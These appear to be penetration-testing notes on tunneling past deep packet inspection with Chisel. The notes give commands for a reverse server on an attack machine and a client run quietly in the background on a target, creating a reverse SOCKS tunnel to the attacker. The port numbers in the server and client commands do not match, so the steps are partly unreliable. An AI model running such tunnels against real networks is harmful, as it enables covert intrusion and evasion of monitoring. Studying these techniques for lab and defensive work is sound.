# Tunneling through deep packet inspection

## HTTP tunneling 
### Chisel 
[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
Chisel is an HTTP tunneling tool that encapsulates data stream within HTTP. 

#### Port forwarding
- We first make a Chisel server on our attack machine that will accept a connection from a chisel client. 
- Chisel will bind a SOCKS proxy port. The server will encapsulate whatever we send through the SOCKS port and push it through the HTTP tunnel (SSH-encrypted). 
- We must then copy the chisel client binary to the target machine. 
- Starting the chisel server :
```bash
chisel server --port 8080 --reverse
```
- logging incoming traffic with `tcpdump`
```bash
sudo tcpdump -nvvvXi tun0 tcp port 8080
``` 
- On the target machine : 
```bash
chisel client <Ip-attack-machine>:1080 R:socks > /dev/null 2>&1 &
```
